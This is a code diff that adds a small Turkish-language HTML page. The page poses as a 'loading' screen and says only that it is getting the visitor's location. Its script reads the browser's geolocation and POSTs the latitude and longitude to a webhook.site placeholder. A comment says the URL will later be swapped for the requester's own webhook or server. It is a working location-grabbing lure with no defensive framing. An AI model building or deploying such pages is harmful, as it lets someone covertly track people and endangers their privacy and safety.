@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Yükleniyor...</title>
+</head>
+<body>
+  <h2>Lütfen bekleyin, konum alınıyor...</h2>
+  <script>
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Gelecek adımda burayı senin webhook veya sunucunla değiştireceğiz
+          fetch("https://webhook.site/örnek-url", {
+              method: "POST",
+              headers: {
+                  "Content-Type": "application/json"
+              },
+              body: JSON.stringify({latitude: lat, longitude: lon})
+          });
+
+          document.body.innerHTML = "<h3>Teşekkürler! Konum alındı.</h3>";
+      }, function(error) {
+          document.body.innerHTML = "<h3>Konum alınamadı. Lütfen izin verin.</h3>";
+      });
+    } else {
+      document.body.innerHTML = "<h3>Tarayıcınız konum hizmetini desteklemiyor.</h3>";
+    }
+  </script>
+</body>
+</html>
